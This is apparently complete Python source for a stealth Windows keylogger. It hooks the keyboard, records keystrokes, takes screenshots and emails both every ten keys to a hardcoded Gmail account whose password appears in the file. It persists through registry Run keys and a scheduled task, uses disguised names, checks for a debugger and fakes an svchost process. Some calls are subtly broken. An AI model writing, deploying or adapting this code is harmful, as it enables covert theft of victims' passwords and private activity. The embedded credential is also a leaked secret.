#!/usr/bin/env python3
import ctypes
import ctypes.wintypes
import sys
import os
import time
import threading
import winreg
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import base64

# === CONFIG ===
GMAIL_USER = "jemsmoha159@gmail.com"  # CHANGE THIS
GMAIL_PASS = "rrtd qzah cwfa lpdg"      # CHANGE THIS  
SEND_EVERY = 10                       # Keys before email

# Windows APIs
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", ctypes.wintypes.DWORD),
                ("scanCode", ctypes.wintypes.DWORD),
                ("flags", ctypes.wintypes.DWORD),
                ("time", ctypes.wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]

class StealthKeylogger:
    def __init__(self):
        self.logs = []
        self.count = 0
        self.running = True
        self.hook = None
        self.appdata = os.path.join(os.getenv('APPDATA', '/tmp'), '.syscache')
        os.makedirs(self.appdata, exist_ok=True)
        
    def vk_to_char(self, vk):
        special = {8:'[BS]',9:'[TAB]',13:'[ENT]',27:'[ESC]',32:' '}
        if 0x30 <= vk <= 0x39: return chr(vk)
        if 0x41 <= vk <= 0x5A: return chr(vk).lower()
        if 0x60 <= vk <= 0x69: return chr(vk-48)
        return special.get(vk, f'[VK{vk:02X}]')
    
    def screenshot(self):
        try:
            from PIL import ImageGrab
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            path = os.path.join(self.appdata, f'shot_{ts}.png')
            img = ImageGrab.grab()
            img.thumbnail((400,300))
            img.save(path, 'PNG', optimize=True, quality=50)
            return path
        except: return None
    
    def send_email(self):
        if not self.logs: return
        try:
            msg = MIMEMultipart()
            msg['From'] = GMAIL_USER
            msg['To'] = GMAIL_USER
            msg['Subject'] = f"Pentest-{os.getenv('COMPUTERNAME', 'UNK')}"
            
            body = f"User: {os.getenv('USERNAME')}\nPC: {os.getenv('COMPUTERNAME')}\n\n" + '\n'.join(self.logs[-50:])
            msg.attach(MIMEText(body))
            
            shot = self.screenshot()
            if shot:
                with open(shot, 'rb') as f:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', 'attachment; filename=screen.png')
                    msg.attach(part)
            
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(GMAIL_USER, GMAIL_PASS)
            server.sendmail(GMAIL_USER, GMAIL_USER, msg.as_string())
            server.quit()
        except: pass
        finally:
            self.logs.clear()
    
    def hook_proc(self, nCode, wParam, lParam):
        if nCode >= 0 and wParam == 0x100:
            vk = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents.vkCode
            ts = datetime.now().strftime('%H:%M:%S')
            self.logs.append(f"[{ts}] {self.vk_to_char(vk)}")
            self.count += 1
            if self.count >= SEND_EVERY:
                threading.Thread(target=self.send_email, daemon=True).start()
                self.count = 0
        return user32.CallNextHookEx(self.hook, nCode, wParam, lParam)
    
    def run(self):
        self.POINTER = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.wparam, ctypes.lparam)(self.hook_proc)
        self.hook = user32.SetWindowsHookExW(13, self.POINTER, kernel32.GetModuleHandleW(None), 0)
        msg = wintypes.MSG()
        while self.running:
            if user32.GetMessageW(ctypes.byref(msg), None, 0, 0) <= 0: break
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))

def persistence():
    """4x Redundant - Survives reboot"""
    exe = sys.executable
    
    # 1. HKCU Run (User)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                           r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'SysCacheSvc', 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
    except: pass
    
    # 2. Scheduled Task (Most reliable)
    try:
        os.system(f'schtasks /create /tn "SysCacheSvc" /tr "{exe}" /sc onlogon /rl limited /f')
    except: pass
    
    # 3. HKLM Run (Admin)
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                           r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 
                           0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
        winreg.SetValueEx(key, 'SysCacheUpdate', 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
    except: pass

def anti_analysis():
    if kernel32.IsDebuggerPresent(): sys.exit(0)

if __name__ == '__main__':
    anti_analysis()
    persistence()
    
    # svchost disguise (invisible)
    si = wintypes.STARTUPINFOW()
    pi = wintypes.PROCESS_INFORMATION()
    ctypes.windll.kernel32.CreateProcessW(None, "svchost.exe", None, None, False, 
                                        0x00000004 | 0x08000000, None, None, 
                                        ctypes.byref(si), ctypes.byref(pi))
    
    kl = StealthKeylogger()
    threading.Thread(target=kl.run, daemon=True).start()
    
    # Keep alive (invisible)
    while True: time.sleep(100)
